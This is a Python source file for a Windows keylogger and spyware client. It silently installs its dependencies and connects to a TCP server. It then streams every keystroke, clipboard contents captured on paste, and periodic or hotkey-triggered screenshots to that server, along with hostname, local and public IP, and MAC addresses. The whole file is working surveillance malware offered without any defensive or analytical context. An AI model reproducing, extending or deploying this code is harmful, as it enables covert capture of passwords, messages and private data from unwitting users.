
import subprocess
import sys
import importlib.util

# List of required libraries
required_libraries = ['pynput', 'Pillow', 'requests', 'pywin32', 'psutil']

# Function to install missing libraries
def install_libraries(libraries):
    for lib in libraries:
        if importlib.util.find_spec(lib) is None:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            except Exception:
                pass
install_libraries(required_libraries)

from pynput import keyboard
import socket
import win32clipboard
from PIL import ImageGrab
import sched
import time
import io
import platform
import requests
import threading
import psutil
# Define the server address and port
serverHost = 'localhost'
serverPort = 9999

# Create a TCP/IP socket
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect((serverHost,serverPort))
keys_pressed = set()
count = 1
text = ""
iteration_screen_with_sec = 600
info =dict()
def screenShot(name):
    global count
    im = ImageGrab.grab()
    with io.BytesIO() as output:
        im.save(output, format="PNG")
        screenshot_data = output.getvalue()
        clientSocket.sendall(b'screenshot_name')
        time.sleep(1)  # Allow time for the server to prepare
        clientSocket.sendall(f'{name}{count}.png'.encode())
        clientSocket.sendall(screenshot_data)
        time.sleep(1)
        clientSocket.sendall(b'Done')
    count += 1

def get_system_info():
    global info
    system_info = ''
    info['Hostname']= socket.gethostname()
    info['IP Address']= socket.gethostbyname(info['Hostname'])
    info['Processor'] = platform.processor()
    info['Operating System'] = platform.system()
    info['Version'] = platform.version()
    info['Machine Info'] = platform.machine()
    info['Public IP Address'] = requests.get('https://api.ipify.org').text
    info['MAC Address To Wi-Fi'] = psutil.net_if_addrs()['Wi-Fi'][0].address
    info['MAC Address To Ethernet'] = psutil.net_if_addrs()['Ethernet'][0].address
    for key,value in info.items():
        system_info += f'{key} : {value}\n'
    clientSocket.sendall(b'system_info')
    clientSocket.sendall(system_info.encode())

get_system_info()

def keyPress(key):
    global text ,count
    print(key)
    try:
        if key == keyboard.Key.enter:
            clientSocket.sendall('\n'.encode())
            clientSocket.sendall(text.encode())
            text=''
        elif key == keyboard.Key.tab:
            text += '\t'
            clientSocket.sendall('\t'.encode())
        elif key == keyboard.Key.space:
            text += ' '
            clientSocket.sendall(' '.encode())
        elif key == keyboard.Key.print_screen:
            screenShot('screen')
        elif key == keyboard.Key.backspace:
                clientSocket.sendall(b'backspace')
                text = text[:-1]  
        elif  key == keyboard.KeyCode.from_char('\x16') :
                win32clipboard.OpenClipboard()
                pastedData = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                clientSocket.sendall(b'paste')
                clientSocket.sendall(pastedData.encode())
        elif key == keyboard.Key.cmd:
            keys_pressed.add('cmd')
        elif key == keyboard.Key.shift:
            keys_pressed.add('shift')
        elif key.char == 'S':
            keys_pressed.add('S')
        elif key == keyboard.Key.esc:
            return False
        else:
            char = key.char
            if len(char) == 1:  
                text += char
                clientSocket.sendall(char.encode())

        if 'cmd' in keys_pressed and 'shift' in keys_pressed and 'S' in keys_pressed:
            screenShot('screen')
            keys_pressed.clear()
  
    except Exception:
        pass

def scheduleScreenshots():
    screenShot('screenshot')
    scheduler.enter(iteration_screen_with_sec, 1, scheduleScreenshots)  # Schedule the next screenshot 

def startScheduler():
    scheduler.enter(0, 1, scheduleScreenshots)
    scheduler.run()

scheduler = sched.scheduler(time.time, time.sleep)
# Threading
scheduler_thread = threading.Thread(target=startScheduler)
scheduler_thread.start()

with keyboard.Listener(on_press=keyPress) as listener:
    listener.join()



